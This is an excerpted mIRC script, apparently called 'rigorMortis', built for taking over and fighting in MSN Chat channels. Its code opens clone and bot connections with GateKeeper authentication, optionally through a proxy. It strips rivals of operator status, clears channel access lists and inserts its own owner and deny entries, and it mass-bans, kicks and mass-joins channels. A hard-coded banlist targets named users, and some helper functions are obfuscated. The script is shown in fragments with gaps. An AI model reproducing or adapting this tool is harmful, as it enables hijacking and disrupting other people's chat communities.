alias find {
  var %i = 1
  while ( %i <= $sock(ri*,0) ) {
    if ( $sock(ri*,%i).mark = $+( $chr(37), $chr(35), hackers ) ) { echo -a cock? $sock(ri*,%i) }
    inc %i
  }
}
...
alias massdo {
  ...
  while ( %i <= $sock( rigorMortis.*, 0 ) ) {
    sockwrite -n $sock( rigorMortis.*, %i ) $replace( $1-, CHAN, $sock( rigorMortis.*, %i ).mark )
    inc %i
  }
}
...
alias setSock { $sSet( $$1, $$2 ) }
alias delSock { hdel rigorMortis $$1 }
alias setKey { writeini c:\rigorMortis\main.ini $$1 $$2 $$3- }
...
alias getCurAuthString { return $getAuthString($getCurPp) }
alias getCurSub { return $getSub($getCurPp) }
alias getCurPp { return $+( $chr(37), $readini( passport.ini, settings, curPp ) ) }
...
alias -l MD5ArrFind { return $iif( $regex( $+( $MD5Split($1), $asciiToHex( , $gettok( $1, 1, 64 )), $MD5Rotate($1) ), $+( ^, 463, $chr(56), $MD5Array($1), 433, $chr(57), 3, $MD5Split($1), 646, 42, 343, 038, 3, $chr(57), 34, 363, $chr(56), 37, 3, 2, $chr(36) ) ) || $regex( $+( $MD5BackSplit($1), $asciiToHex( , $gettok( $1, 1, 64 )), $MD5ARotate($1) ), $+( ^, 454, $chr(54), $MD5Split($1), 3433, 3, 944, $chr(51), 845, $Mod(64), $chr(52), $chr(49), 353, 4, 35, $str( $chr(51), 3 ), 63, 431, $chr(36) ) ), 1, 0 ) }
...
alias -l sockMrc { return $+( $chr(3), 5sidBot, $chr(15) ) }
...
alias -l MessageDigestSplit { return $hexToAscii( $+( 4D, $chr(52), F, 4, $str( $chr(52), 2 ), 5 ), $MD5CheckSum($1) ) $Mod($2) $$1 $hexToAscii( $+( $chr(50), B7, $chr(49) ), null ) $mid( $gettok( $2, $eval($chr(49)), $eval($+( $chr(51), $chr(51) )) ), $eval($chr(50)) ) }
...
alias namesall {
  ...
  while ( %i <= $sock( rigorMortis.*, 0 ) ) {
    ...
    sockwrite -n client.mirc NAMES $sock(%s).mark
    inc %i
  }
}
alias f1 {
...
alias update {
  var %pp, %pw, %li  
  %pp = $iif( $1, $1, $mid( $getCurPp, 2 ) )
  %pw = $readini( passport.ini, %pp, password )
  %pp = $+( $chr(37), %pp )
  %pw = $+( $chr(37), %pw )
...
alias -l motd {
  ...
  sockmark %s /FearTheSheep/MOTD.rM
}
...
on *:sockread:MOTD.????????????????:{
  ...
  while ( $sockbr ) {
    ...
    if ( %rw == MOTD: ) { 
      $setMotd($right( %r, -6 )) 
      $print( 5, -se, MOTD for $gettok( $getMotd(), 1-2, 32 ) - $gettok( $getMotd, 3-, 32 ) ) 
      sockclose $sockname
    }
...
menu channel {
  ...
  .- 
  .$+( $iif( %whois != off, $style(1) ), Whois onjoin ) : set %whois $iif( $popup.check( whois ) == on, off, on )
  ...
  .-
  .$+( $iif( $popup.check( whois, # ) == on, $style(1) ), Whois onjoin ) : set %whois. [ $+ [ # ] ] $iif( $popup.check( whois, # ) == on, off, on )
...
on *:sockread:client.mirc:{
  ...
  elseif ( ABOT == $1 ) {
    ...
    %c = $2
    %ip = $$sock($$getSock(%c)).ip
    %n = sockErr,root,bocks,bawks,prawksee,procksee,sid_
    %n = $gettok( %n, $r( 1, $numtok( %n, 44 ) ), 44 )
    $ocx.init( %id, %ip, bot )
    %sk = $+( bot., %id )
    sockopen %sk %ip 6667
    sockmark %sk %c 
  ...
  elseif ( BOTJOIN == $1 ) {
    ...
    %c = $iif( $2, $2, $active )
    %s = $getBotSock(%c)
    sockwrite -n $getSock(%c) $+( ACCESS %c add $iif( $me isowner %c, owner, host ) *!, $getBotGate(%s) 0 :, $sockMrc $vers, $crlf, ACCESS %c add voice *!, $gettok( $getBotGate(%s), 1, 64 ), @* 0 :, $sockMrc $vers )
  ...
  elseif ( BOTHOP == $1 ) {
    ...
    %c = $iif( $2, $2, $active )
    %s = $getBotSock(%c)
    sockwrite -n $getSock(%c) $+( $iif( $getBotNick(%s) isop %c && $me isowner %c, $+( ACCESS %c delete host *!, $getBotGate(%s), $chr(36), *, $crlf ) ), ACCESS %c add $iif( $me isowner %c, owner, host ) *!, $getBotGate(%s) 0 :, $sockMrc $vers, $crlf, ACCESS %c add voice *!, $gettok( $getBotGate(%s), 1, 64 ), @* 0 :, $sockMrc $vers )
  ...
  elseif ( BOTDEOP == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c -qo $$2 $$2, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS %c add deny *@217.* )
  }
  elseif ( BOTDEVOICE == $1 ) { 
    var %c
    %c = $active
    sockwrite -n $$getBotSock(%c) $+( MODE %c -v $$2, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS %c add deny *@217.* )
  }
  elseif ( BOTVOICE == $1 ) { 
    var %c
    %c = $active
  ...
  while ( $sockbr ) { 
    ...
    if ( AUTH == $1 ) {
      ...
      elseif ( AUTH \0\0\0 ? ????????????????* iswm $1-4 ) { 
        ...
        if ( $getBotCloneStatus != on ) {
          BOTJOIN $getBotChan($sockname)
        }
        else {
          var %c, %s
          %c = $sock($sockname).mark
          %s = $sockname
          sockwrite -n $$sock($getBotCloneOld) PART %c
    ...
    elseif ( MODE == $2 ) {
      ...
      elseif ( $4 == +q ) {
        if ( $5 == $me ) && ( $getBotNick($sockname) !isowner $3 ) && ( !%floodingsocky. [ $+ [ $3 ] ] ) {
          BOTHOP $3
          inc -u10 %floodingsocky. [ $+ [ $3 ] ]
        }
        elseif ( $popup.check( sockDeowner, $3 ) == on ) && ( !$ini( aop.ini, global, $ial( $5, 1 ).addr ) ) && ( !$ini( aop.ini, $mid( $3, 2 ), $ial( $5, 1 ).addr ) ) && ( $5 != $getBotNick($sockname) ) && ( !%sockno+q. [ $+ [ $3 ] ] ) && ( $5 != $me ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $getBotNick($sockname) ) {
      ...
      elseif ( $4 == +o ) {
        if ( $5 == $me ) && ( $getBotNick($sockname) !isop $3 ) && ( !%floodingsocky. [ $+ [ $3 ] ] ) {
          BOTHOP $3
          inc -u10 %floodingsocky. [ $+ [ $3 ] ]
        }
        elseif ( $popup.check( sockDeop, $3 ) == on ) && ( !$ini( ahost.ini, global, $ial( $5, 1 ).addr ) ) && ( !$ini( ahost.ini, $mid( $3, 2 ), $ial( $5, 1 ).addr ) ) && ( $5 != $getBotNick($sockname) ) && ( !%sockno+o. [ $+ [ $3 ] ] ) && ( $5 != $me ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $getBotNick($sockname) ) {
          sockwrite -n $sockname $+( MODE $3 -qo $5 $5, $crlf, ACCESS $3 clear host, $crlf, PROP $3 hostkey $key, $crlf, ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add deny *@217.* )
          inc -u2 %sockno+o. [ $+ [ $3 ] ]
        }  
      }
    }
    ...
    elseif ( JOIN == $2 ) { 
      ...
      if ( %n == $getBotNick($sockname) ) {
        if ( $left( %n, 1 ) == > ) { 
          if ( $gettok( $3, 4, 44 ) == . ) { sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) delete owner *!, $getBotGate($sockname), $chr(36), * ) }
          elseif ( $gettok( $3, 4, 44 ) == @ ) { sockwrite -n $sockname $+( ACCESS $mid( $4, 2 ) delete host *!, $getBotGate($sockname), $chr(36), * ) }
        }
      }
      ...
      elseif ( $gettok( $3, 4, 44 ) == @ ) && ( $popup.check( botNoAccess, $mid( $4, 2 ) ) == on ) && ( !$ini( ahost.ini, global, $gettok( $1, 2, 33 ) ) ) && ( !$ini( ahost.ini, $mid( $4, 3 ), $gettok( $1, 2, 33 ) ) ) && ( %n != $me ) && ( !%botaccesso. [ $+ [ $mid( $4, 2 ) ] ] ) { 
        sockwrite -n $sockname $+( MODE $mid( $4, 2 ) -qo %n %n, $crlf, PROP $mid( $4, 2 ) hostkey $key, $crlf, ACCESS $mid( $4, 2 ) clear host, $crlf, ACCESS $mid( $4, 2 ) add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $mid( $4, 2 ) add deny *@217.* )
...
menu status {
  ...
  .$+( $iif( %font != off, $style(1) ), Show fonts ) : set %font $iif( $popup.check( font ) == on, off, on )
  .$+( $iif( %chanProt != off, $style(1) ), Channel protection ) : set %chanProt $iif( $popup.check( chanProt ) == on, off, on )
  .$+( $iif( %useProxy != off, $style(1) ), Use proxy ) : set %useProxy $iif( $popup.check( useProxy ) == on, off, on )  
  .-
  .Reset settings : {
    unset %*aop
    unset %*ahost
...
on *:start:{ 
  ...
  %chanProt = off
  .flood 350 9999 10 0
  writeini -n banlist.ini 0D56A21B236764F8@GateKeeperPassport nick Duke
  writeini -n banlist.ini 0D56A21B236764F8@GateKeeperPassport reason Welcome to the global banlist my 'friend' - sid.
  writeini -n banlist.ini 5E33B4D839CB7AA9@GateKeeperPassport nick Duke
  writeini -n banlist.ini 5E33B4D839CB7AA9@GateKeeperPassport reason Welcome to the global banlist my 'friend' - sid.
}
...
alias -l mrc { return $+( $chr(3), 5, sid, $chr(3), $chr(15) ) }
alias -l chatServers2 {
  var %i, %ip, %ns, %id
  %i = 1
  while ( %i <= 6 ) {
...
alias -l chatServers {
  ...
  while ( %i <= 6 ) {
    ...
    %ns = $msn.host( ns, %i )
    %id = $hexString
    $connect( %id, %ip, %ns, $iif( $1, $1 ), $iif( $popup.check(useProxy) == on, %proxy ) )
    inc %i
  }
}
...
alias -l connect {
  ...
  $ocx.init( %id, %ip, $$3 )
  if ( %py ) {
    sockopen %sk $replace( %py, :, $chr(32) )
    sockmark %sk %ip $iif( $4, $4, $me )
  }
  else {
    sockopen %sk %ip 6667 
...
on *:sockopen:TK2CHATCHATA0?.????????????????:{ 
  if ( !$sockerr ) { 
    var %sm = $sock($sockname).mark
    if ( $numtok( %sm, 46 ) == 4 ) {
      sockwrite -n $sockname CONNECT $+( $gettok( %sm, 1, 32 ), :6667, $crlf, $crlf )
      sockmark $sockname $gettok( %sm, 2, 32 ) $gettok( %sm, 1, 32 )
    }
    else {
      sockwrite -n $sockname $+( NICK $sock($sockname).mark, $crlf, AUTH GateKeeper, $iif( $left( $sock($sockname).mark, 1 ) != >, Passport, $chr(32) ) I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC7 MSNTV-TELCO!9.02.0310.2401 ) 
    }
  }
  else {  
    $print( 5, -st, Error connecting - $sockname server is down )
  }
}
on *:sockopen:clone.*:{ 
...
on *:sockread:TK2CHATCHATA0?.????????????????:{
  ...
  while ( $sockbr ) { 
    ...
    elseif ( $gettok( %r, 2, 32 ) == 200 ) {
      ; // proxy successful

      var %nk = $gettok( $sock($sockname).mark, 1, 32 )
      sockwrite -n $sockname $+( NICK %nk, $crlf, AUTH GateKeeper, $iif( $left( %nk, 1 ) != >, Passport, $chr(32) ) I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC7 MSNTV-TELCO!9.02.0310.2401 ) 
    }
    elseif ( $gettok( %r, 2, 32 ) == JOIN ) {
      var %s, %ip, %sk, %id, %c
      %s  = $sockname
      %ip = $iif( $gettok( $sock(%s).mark, 2, 32 ), $gettok( $sock(%s).mark, 2, 32 ), $sock(%s).ip )
      %id = $hexString
      %sk = $+( rigorMortis., %id ) 
      %c  = $mid( $gettok( %r, 4, 32 ), 2 )
      sockrename %s %sk 
      ...
      sockmark %sk %c
      %id = $hexString
      $connect( %id, %ip, $gettok( %s, 1, 46 ), , $iif( $popup.check(useProxy) == on, %proxy ) )
      $setKey( $mid( %c, 2 ), server, %ip )
      $setSock( %c, %sk )
    }
    elseif ( $gettok( %r, 1, 32 ) == PING ) { sockwrite -n $sockname pong $mid( %r, 5 ) }
  ...
  while ( $sockbr ) { 
    ...
    if ( $2 == MODE ) {
      if ( $4 $5 == -q $me ) && ( $me isowner $3 ) && ( !%-qflood. [ $+ [ $3 ] ] ) && ( $me != $mid( $gettok( $1, 1, 33 ), 2 ) ) && ( $mid( $getKey( $mid( $3, 2 ), q), 2 ) ) {
        if ( $popup.check( hopprot, $3 ) != off ) { sockwrite -nb $sockname 512 $+( PART $3, $crlf, JOIN $3 $getKey( $mid( $3, 2 ), q ) ) }
      ...
      elseif ( $4 $5 == +q $me ) && ( !%+qflood. [ $+ [ $3 ] ] ) { 
        ...
        if ( !%meJoin. [ $+ [ $3 ] ] ) {
          sockwrite -n $sockname $+( ACCESS $3 delete host *!, %gate, $crlf, ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf, PROP $3 ownerkey $key, $crlf ) 
        }
        inc -u5 %+qflood. [ $+ [ $3 ] ]
      } 
      elseif ( $4 $5 == +o $me ) && ( !%+oflood. [ $+ [ $3 ] ] ) { 
        sockwrite -n $sockname $+( ACCESS $3 add host *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf, ACCESS $3 add owner '*!*@* 0 :, $mrc, $vers ) 
        inc -u3 %+oflood. [ $+ [ $3 ] ]
      }
      elseif ( $4 == +q ) && ( $me isowner $3 ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $me ) && ( !%++qflood. [ $+ [ $3 ] ] ) { 
        sockwrite -nb $sockname 512 $+( ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf )
        inc -u4 %++qflood. [ $+ [ $3 ] ]
      }
      elseif ( $4 == +o ) && ( $me isop $3 ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $me ) && ( !%++oflood. [ $+ [ $3 ] ] ) { 
        sockwrite -nb $sockname 512 $+( ACCESS $3 add host *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf )
        inc -u4 %++oflood. [ $+ [ $3 ] ]
      } 
      sockwrite -n client.mirc %r 
    }
    ...
    elseif ( $2 == JOIN ) { 
      ...
      if ( %n == $me ) { 
        ...
        if ( %a == . ) && ( !%meJoin. [ $+ [ $sock($sockname).mark ] ] ) {
          ...
          elseif ( %autoNull. [ $+ [ $3 ] ] == on ) {
            ...
            sockwrite -n $sockname $+( ACCESS $sock($sockname).mark add owner *!, %gate 0 :, $mrc $vers, $crlf, PROP $sock($sockname).mark ownerkey $key, $crlf ) 
          }
          inc -u6 %meJoin. [ $+ [ $sock($sockname).mark ] ]
        }
      ...
      elseif ( %n != $me ) {
        ...
        if ( !%whoisflood. [ $+ [ $mid( $4, 2 ) ] ] ) && ( $popup.check( whois, $mid( $4, 2 ) ) == on ) { sockwrite -n $sockname WHOIS %n | inc -u3 %whoisflood. [ $+ [ $mid( $4, 2 ) ] ] }
      }
    }
    ...
    elseif ( $2 isnum ) {
      if ( $2 == 311 ) {  
        var %ta, %rm
        %ta = $mid( $8-, 2 )
        $print( , -t $sock($sockname).mark, $+( $4, 's tag is ', %ta, $chr(3), $color(info), ' ) ) 
        %ta = $strip(%ta) 
        if ( $+( rigorMortis $chr(40), 2.?* ) iswm %ta ) { sockwrite -n $sockname $+( ACCESS $sock($sockname).mark add deny $5, @* 0 :, $mrc $vers, $crlf, KICK $sock($sockname).mark $4 :, $chr(3), 5Incorrect version $chr(3), 2', $chr(3), 5, %ta, $chr(3), 2', $crlf, ACCESS $sock($sockname).mark clear owner, $crlf, PROP $3 ownerkey $key, $crlf, MODE $sock($sockname).mark +q $me ) }
      }
      elseif ( $2 = 353 ) {
        var %re, %b, %m
      ...
      elseif ( $2 == 352 ) { 
        var %u
        %u = $+( $5, @, $6 )
        if ( $ini( banlist.ini, %u ) ) && ( $popup.check( banlist, $4 ) == on ) {
...
on *:dialog:create:sclick:9:{ 
  ...
  %p = $key
  %s = $$sock(findServer.*, 1)
  sockwrite -n %s CREATE $$did(8) %c $mid( $roomEncode($$did(6)), 3 ) $remove( $$did(7), + ) EN-US $mid( %p, 2 ) 1 $mrc $vers
  sockmark %s %c
  $setKey( $mid( %c, 2 ), q, %p ) 
}

alias bClose {
  var %counter, %max, %sock
  %counter = 1
  %max = $sock( Bot.*, 0 )
  while ( %counter <= %max ) {
    %sock = $sock( Bot.*, %counter )
    if ( $sock(%sock).mark == $active ) { sockclose %sock }
    inc %counter
  }
}
...
alias mban {
  ...
  %counter = 1
  %kick = ""
  while ( %counter <= $nick( $active, 0 ) ) {
    if ( $nick( $active, %counter ) != $me ) && ( $nick( $active, %counter ) != $getBotNick($getBotSock($active)) ) {
      $clientQue( ACCESS $active add deny $+( *, $ial( $nick( $active, %counter ) ).addr ) )
      %kick = $+( %kick, $chr(44), $nick( $active, %counter ) )
    }
    inc %counter
  }
  $clientque( ACCESS $active clear owner ) 
  $clientQue( KICK $active %kick )
  $clientQue( PROP $active ownerkey $key )
}

alias writechans {

  var %counter, %max, %chan
  %counter = 1
  %max = $chan(0)
  .remove channels.txt
...
alias massJoin {
  ...
  set %gcounter 1
  .timerhacker -m $lines(channels.txt) 2000 MassJoin-
}

alias MassJoin- {
  var %chan
  %chan = $read( channels.txt, %gcounter )
  JOIN %chan
  inc %gcounter
}
...
alias lol {
  var %counter
  %counter = 1
  while ( %counter <= $ini(address.ini,0) ) {
    msg $active $ini( address.ini, %counter )
    inc %counter
  }
}
...
alias -l poo {
  ...
  var %string = $$1 
  var %length = $iif( $2, $2, 100 )

  return $iif( $len(%string) > %length, $+( $left( %string, $calc( %length - 2 ) ), .. ), %string )
}

alias hmm { 
  .timerfroo 50 1 bottease doc
}
